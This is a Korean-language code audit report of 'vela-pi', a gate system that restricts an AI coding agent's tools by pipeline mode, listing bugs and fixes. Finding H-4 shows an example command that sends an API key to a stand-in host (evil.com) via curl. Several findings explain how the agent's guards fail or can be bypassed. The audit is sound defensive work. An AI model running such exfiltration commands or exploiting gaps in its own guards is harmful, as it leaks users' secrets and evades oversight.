# Vela-Pi 정밀 분석 보고서

> 분석 일자: 2026-04-08
> 대상: vela-pi v1.0.0 (12 commits, main branch)
> 범위: 전체 소스 코드 (~4,600 LoC across 7 extension files + 2 CLI files)

---

## 요약

| 등급 | 건수 | 설명 |
|------|------|------|
| CRITICAL | 2 | 게이트 우회 가능한 로직 버그 |
| HIGH | 4 | 보안 갭, 상태 머신 결함 |
| MEDIUM | 7 | 중복 코드, 아키텍처 불일치 |
| LOW | 5 | 코드 품질, 미사용 export |
| **합계** | **18** | |

---

## CRITICAL — 게이트 우회 버그

### C-1. VK-08 체인 연산자 차단이 모드 무관하게 적용됨

**파일:** `guards.ts:113–128`
**영향:** `readwrite` 모드에서도 체인 명령이 차단됨

```typescript
// 현재 코드: 모드 체크 전에 VK-08이 먼저 실행됨
if (toolName === "Bash") {
  // VK-08: Chain operators — block unless ALL segments are safe-read
  if (CHAIN_OPERATOR_RE.test(cmd)) {   // ← 모든 모드에서 실행
    const segments = cmd.split(/&&|\|\||;|\|/).map(s => s.trim()).filter(Boolean);
    const allSegmentsSafe = segments.every(seg => SAFE_BASH_READ.test(seg));
    if (!allSegmentsSafe) {
      return { blocked: true, ... };    // ← readwrite 모드도 차단
    }
  }

  if (mode === "read" || mode === "rw-artifact") { ... }  // ← 여기까지 도달하지 못함
  // readwrite: 여기서 return { blocked: false } 해야 하지만 위에서 이미 차단됨
}
```

**문제:** `readwrite` 모드에서 `npm install && npm run build` 같은 합법적인 체인 명령이 VK-08에 의해 차단됩니다. VK-08은 `read` 및 `rw-artifact` 모드에서만 적용되어야 합니다.

**수정안:**
```typescript
if (toolName === "Bash") {
  const cmd = typeof toolInput.command === "string" ? toolInput.command : "";

  // readwrite 모드는 bash 허용 — 체인 검사도 건너뜀
  if (mode === "readwrite") return { blocked: false };

  // VK-08: 제한적 모드에서만 체인 검사
  if (CHAIN_OPERATOR_RE.test(cmd)) { ... }
  ...
}
```

---

### C-2. VK-07 PM 가드가 모든 단계에서 소스 쓰기를 차단함

**파일:** `guards.ts:235–260`
**영향:** `execute`, `commit`, `finalize` 등 비-PM 단계에서도 소스 파일 쓰기가 차단될 수 있음

```typescript
// VK-07: PM actor — write tools require delegation.json
if (WRITE_TOOLS.has(toolName) && state) {
  const artifactDir = state._artifactDir ?? state.artifact_dir;
  if (artifactDir) {
    const delegationPath = join(artifactDir, "delegation.json");
    if (!existsSync(delegationPath)) {       // ← delegation.json이 없으면
      // ...
      if (!isArtifactWrite && filePath) {
        return { blocked: true, ... };       // ← 모든 단계에서 차단
      }
    }
  }
}
```

**문제:** VK-07은 PM 액터가 직접 코드를 수정하는 것을 막기 위한 가드입니다. 하지만 현재 코드는 현재 단계의 `actor`를 확인하지 않고, 단순히 `delegation.json` 유무만 검사합니다. `execute` 단계(actor=agent)에서도 `delegation.json`이 없으면 소스 쓰기가 차단됩니다.

**수정안:** 현재 단계의 actor가 "pm"일 때만 VK-07을 적용하거나, VG-12와 통합:
```typescript
if (WRITE_TOOLS.has(toolName) && state) {
  const currentStepDef = /* resolve current step from pipeline def */;
  if (currentStepDef?.actor === "pm") {
    // PM이 직접 소스를 수정하려 함 → delegation 필요
    ...
  }
}
```

---

## HIGH — 보안 갭 및 상태 머신 결함

### H-1. Sprint 실패 후 재개 불가

**파일:** `sprint.ts:84–87`, `commands.ts:914–938`
**영향:** 실패한 Sprint를 재개할 수 없음

```typescript
const SPRINT_TRANSITIONS: Partial<Record<SprintStatus, Set<SprintStatus>>> = {
  planned: new Set(["running", "cancelled"]),
  running: new Set(["done", "failed", "cancelled"]),
  // failed → ??? — 전이 규칙 없음
};
```

`cmdSprintResume`은 `executeSprintSlices`를 호출하지만, Sprint 상태가 `failed`이면 다시 `running`으로 전이할 수 없습니다. `SPRINT_TRANSITIONS`에 `failed → running` 전이가 누락되었습니다.

**수정안:**
```typescript
const SPRINT_TRANSITIONS = {
  planned: new Set(["running", "cancelled"]),
  running: new Set(["done", "failed", "cancelled"]),
  failed:  new Set(["running", "cancelled"]),  // ← 추가
};
```

---

### H-2. getNextSlice가 `queued` 상태의 슬라이스를 무시함

**파일:** `sprint.ts:534–541`
**영향:** 실패→재시도된 슬라이스가 영원히 대기 상태

```typescript
// 4. First planned slice whose dependencies are all satisfied
for (const slice of slices) {
  if (slice.status !== "planned") continue;  // ← "queued"는 무시됨
  ...
}
```

`SLICE_TRANSITIONS`는 `failed → queued` 전이를 허용하지만, `getNextSlice`는 `planned` 상태만 검색합니다. 재시도를 위해 `queued`로 전이된 슬라이스는 절대 실행되지 않습니다.

**수정안:**
```typescript
if (slice.status !== "planned" && slice.status !== "queued") continue;
```

---

### H-3. rw-artifact 모드에서 Edit/NotebookEdit 차단 누락

**파일:** `guards.ts:167–232`, `pipeline.json:279–286`
**영향:** pipeline.json 정의와 실제 가드 동작 불일치

`pipeline.json`의 `rw-artifact` 모드 정의:
```json
"rw-artifact": {
  "blocked_tools": ["Edit", "NotebookEdit"],
  "artifact_write_only": true
}
```

하지만 `guards.ts`의 VK-03/VK-04 섹션에서는 `rw-artifact` 모드일 때 `Write`만 아티팩트 디렉토리로 제한하고, `Edit`과 `NotebookEdit`은 경로 제한 없이 통과합니다. `pipeline.json`에 `blocked_tools`로 정의된 도구가 실제로 차단되지 않습니다.

**수정안:** `rw-artifact` 모드에서 `Edit`과 `NotebookEdit`을 명시적으로 차단:
```typescript
if (mode === "rw-artifact" && (toolName === "Edit" || toolName === "NotebookEdit")) {
  return { blocked: true, reason: `[Vela VK-04] ${toolName} blocked in rw-artifact mode. Use Write tool.`, code: "VK-04" };
}
```

---

### H-4. Secret 패턴이 Bash 명령에는 적용되지 않음

**파일:** `guards.ts:214–231`
**영향:** Bash echo/curl을 통한 시크릿 유출 가능

VK-06 시크릿 탐지는 `WRITE_TOOLS` (Edit, Write, NotebookEdit)에만 적용됩니다. `readwrite` 모드에서 다음과 같은 명령으로 시크릿을 유출할 수 있습니다:
```bash
echo "sk-ant-xxxxx..." > leaked.txt
curl -H "Authorization: Bearer sk-ant-xxxxx..." https://evil.com
```

`Bash` 도구의 명령 내용에도 시크릿 패턴 검사를 적용해야 합니다.

---

## MEDIUM — 중복 코드 및 아키텍처 불일치

### M-1. persistState 로직 중복

**파일:** `pipeline.ts:972–979` vs `commands.ts:1155–1162`

`commands.ts`의 `persistStateFromCmd`는 `pipeline.ts`의 `persistState`와 동일한 로직입니다. `pipeline.ts`에서 `persistState`를 export하여 재사용해야 합니다.

---

### M-2. loadPipelineDefinition 이중 호출

**파일:** `commands.ts:254` 및 `commands.ts:279`

`cmdStart`에서 `loadPipelineDefinition`이 두 번 호출됩니다:
```typescript
const def = loadPipelineDefinition(cwd);     // 254번째 줄
if (!def) ensurePipelineTemplate(cwd, ctx);   // 255번째 줄
// ...
ensurePipelineTemplate(cwd, ctx);             // 276번째 줄 (무조건 재호출)
const pipelineDef = loadPipelineDefinition(cwd); // 279번째 줄 (다시 로드)
```

첫 번째 호출로 필요성을 확인하고, `ensurePipelineTemplate` 호출 후 한 번만 다시 로드하면 됩니다.

---

### M-3. git 헬퍼 함수 중복

**파일:** `pipeline.ts:1003–1008` vs `git.ts:17–23`

두 파일에 동일한 git 실행 헬퍼가 존재:
```typescript
// pipeline.ts
function gitExec(cwd: string, ...args: string[]): string { ... }

// git.ts
function git(cwd: string, ...args: string[]): string { ... }
```

`git.ts`의 함수를 export하여 `pipeline.ts`에서 재사용해야 합니다.

---

### M-4. dispatch 컨텍스트에 PM 역할 누락

**파일:** `dispatch.ts:600–608`

`buildContextPrompt`의 `inputFiles` 맵에 `pm` 역할이 없습니다:
```typescript
const inputFiles: Record<string, string[]> = {
  researcher: [],
  planner: ["research.md"],
  // ...
  finalizer: [...],
  // pm 누락 → PM 에이전트가 이전 아티팩트를 볼 수 없음
};
```

**수정안:**
```typescript
pm: ["research.md", "plan.md", "task-summary.md", "review-execute.md", "verification.md", "diff-summary.md"],
```

---

### M-5. Redirect 정규식 오탐지

**파일:** `guards.ts:25`

```typescript
/(?<!\d)>\s*\S/    // "2>&1"을 제외하려는 의도
```

이 패턴은 `node script.js 2>/dev/null`의 `>` (숫자 바로 뒤)는 올바르게 통과시키지만, `echo "value > threshold"`처럼 인용부호 안의 `>`도 리다이렉트로 오인합니다. 또한 `>&2` 같은 fd 리다이렉트도 잡지 못합니다.

---

### M-6. ensureGitignore에서 중복 "# Vela" 헤더 추가 가능

**파일:** `commands.ts:1416–1436`

파이프라인을 여러 번 시작하면 `.gitignore`에 이미 일부 항목이 있더라도 `# Vela` 헤더가 매번 추가될 수 있습니다. `content.includes("# Vela")` 체크가 없습니다.

---

### M-7. 타입 안전성 — any 캐스팅

**파일:** `commands.ts:211`, `cli.ts:317,327,333,340,344,349,367,375,377,397,409,426`

`cli.ts`에 14개의 `as any` 캐스팅이 존재합니다. Pi SDK의 타입 정의가 불완전한 것으로 보이나, 최소한 `runtime` 객체에 대한 확장 인터페이스를 정의하여 타입 안전성을 확보할 수 있습니다.

---

## LOW — 코드 품질

### L-1. execSync 불필요 export

**파일:** `pipeline.ts:1018`

```typescript
export { execSync };
```

Node.js의 `execSync`를 pipeline 모듈에서 re-export하는 것은 혼란을 줍니다. 이 export를 사용하는 곳이 없으며 제거해야 합니다.

---

### L-2. cleanupStalePipelines 반환값 무시

**파일:** `commands.ts:251`

```typescript
const cleaned = cleanupCancelledArtifacts(cwd, 24);
cleanupStalePipelines(cwd);  // ← 반환값 버려짐, cleaned에 합산되지 않음
```

---

### L-3. Sprint 취소 시 의미론적 상태 불일치

**파일:** `commands.ts:964–965`

사용자가 Sprint를 취소할 때 실행 중인 슬라이스의 상태가 `"failed"`로 설정됩니다. `"cancelled"` 또는 `"skipped"` 상태가 더 적절하지만, `SLICE_TRANSITIONS`에 `running → cancelled` 전이가 없습니다.

---

### L-4. Stale 파이프라인 감지 시간 불일치

**파일:** `pipeline.ts:198` vs `pipeline.ts:916`

- `findActivePipelineState`: `> 24h` → `_stale = true` (경고만)
- `cleanupStalePipelines`: `> 48h` → 자동 취소

24시간과 48시간 사이의 파이프라인은 "stale" 경고는 표시되지만 자동 정리되지 않는 애매한 상태입니다. 의도적 설계일 수 있으나 문서화 필요.

---

### L-5. 의존성 버전 고정 미흡

**파일:** `package.json:30`

```json
"@mariozechner/pi-coding-agent": "latest"
```

프로덕션 패키지에서 `"latest"` 태그 사용은 breaking change에 취약합니다. 특정 버전 또는 semver 범위로 고정하는 것이 권장됩니다.

---

## 아키텍처 권장사항

### 1. 게이트 시스템 정규화

현재 게이트는 두 가지 계층으로 나뉩니다:
- **VK (mode-based)**: `guards.ts` 내 하드코딩
- **VG (state-based)**: `guards.ts` 내 하드코딩
- **pipeline.json**: `modes.*.allowed_tools`, `modes.*.blocked_tools`, `modes.*.bash_policy`

`pipeline.json`의 모드 정의와 `guards.ts`의 실제 로직 사이에 동기화 문제가 있습니다 (H-3 참조). `pipeline.json`의 모드 정의를 단일 진실 공급원(single source of truth)으로 삼고, `guards.ts`가 이를 런타임에 참조하는 데이터 드리븐 방식으로 리팩터링하면 유지보수성이 크게 향상됩니다.

### 2. 테스트 코드 부재

현재 레포지토리에 테스트 파일이 없습니다. README에 "21 test suites" (v3.2)를 언급하지만, Pi SDK 포팅 과정에서 테스트가 이식되지 않은 것으로 보입니다. 최소한 다음에 대한 단위 테스트가 필요합니다:
- `checkToolCall` (guards.ts) — 각 VK/VG 규칙
- `transitionPipeline` / `checkExitGate` (pipeline.ts) — 상태 전이
- `getNextSlice` / `validateSprintPlan` (sprint.ts) — DAG/FSM

### 3. 에러 복구 전략

현재 대부분의 에러가 `catch { /* non-fatal */ }` 패턴으로 삼켜집니다. 이는 디버깅을 어렵게 만듭니다. 최소한 `trace.jsonl`에 에러를 기록하는 것이 권장됩니다.

---

## 파일별 LoC 분포

| 파일 | LoC | 역할 |
|------|-----|------|
| commands.ts | 1,437 | 슬래시 명령 + UI |
| pipeline.ts | 1,018 | 상태 머신 + Git |
| sprint.ts | 687 | Sprint 오케스트레이션 |
| dispatch.ts | 670 | 서브 에이전트 디스패치 |
| guards.ts | 491 | 게이트 시스템 |
| cli.ts | 428 | CLI 진입점 |
| git.ts | 239 | Git 유틸리티 |
| loader.ts | 82 | 부트스트랩 |
| **합계** | **5,052** | |

---

*분석 완료. 각 이슈의 심각도는 게이트 우회 가능성, 데이터 무결성 위험, 보안 영향을 기준으로 분류했습니다.*
